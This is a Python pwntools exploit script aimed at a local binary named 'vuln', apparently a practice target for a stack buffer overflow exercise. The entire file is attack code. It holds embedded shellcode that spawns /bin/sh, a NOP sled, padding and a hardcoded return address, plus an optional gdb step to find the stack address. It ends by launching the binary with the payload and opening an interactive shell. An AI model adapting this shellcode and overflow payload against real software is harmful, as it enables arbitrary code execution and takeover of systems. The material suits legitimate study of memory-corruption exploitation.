from pwn import p64,gdb,process
import re
import os

path = './vuln/vuln'

run_in_gdb = False

#craft base payload
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 
nop = b'\x90' * 40

#grab the rsp address by running a demo process
#only works in gdb context
if run_in_gdb:
    p = process([path,])
    gdb.attach(p,f"b copy\nr {b'a'*(255+16)}\nni\nni\nset logging on\n x/1gx $rsp\nquit")
    p.recvline()
    p.close()
    with open("gdb.txt") as f: addr = [i.group() for i in re.finditer(r'0x[\da-zA-Z]+(?=:)',f.readlines()[0])][0]
    os.remove('gdb.txt')
    addr = p64((int(addr,16))+len(nop)//2).replace(b'\x00',b'')

#hardcoded value (addr of buf) for use in the regular process
else:
    addr = p64(0x7fffffffdc10).replace(b'\x00',b'')
    
#complete payload
payload = (nop+ shellcode+b'A'*(9+(0xff-len(shellcode)-len(nop))) + addr)
print(f"addr{addr.hex()}")
print(payload)

#now spawns the shell
p= process([path, payload])
p.interactive()
p.close()

#b *0x5555555551c8